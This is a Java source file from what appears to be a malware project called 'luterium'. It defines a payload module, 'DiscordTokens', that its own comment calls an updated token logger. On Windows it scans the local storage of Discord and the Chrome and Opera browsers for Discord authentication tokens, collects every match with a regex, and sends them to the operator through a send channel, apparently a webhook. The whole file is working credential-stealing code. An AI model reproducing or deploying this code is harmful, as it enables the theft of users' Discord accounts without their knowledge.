package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import java.io.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Peter
 * @since 08/26/2022
 * Basically Travis' token logger but updated.
 */

public class DiscordTokens implements PayloadExecutor { //Gets discord tokens.
    public static Main main = new Main();

    public String OS = System.getProperty("os.name");

    @Override
    public void execute() throws Exception {
        if (OS.contains("Windows")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();

                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {
                                Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                                Matcher m = pattern.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }

                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
                main.theThing.send("```Discord Tokens: \n" + webhooks.toString() + "```");
            } catch (Exception e) {
                main.theThing.send("```UNABLE TO PULL TOKENS: " + e + "```");
            }
        }
    }
}
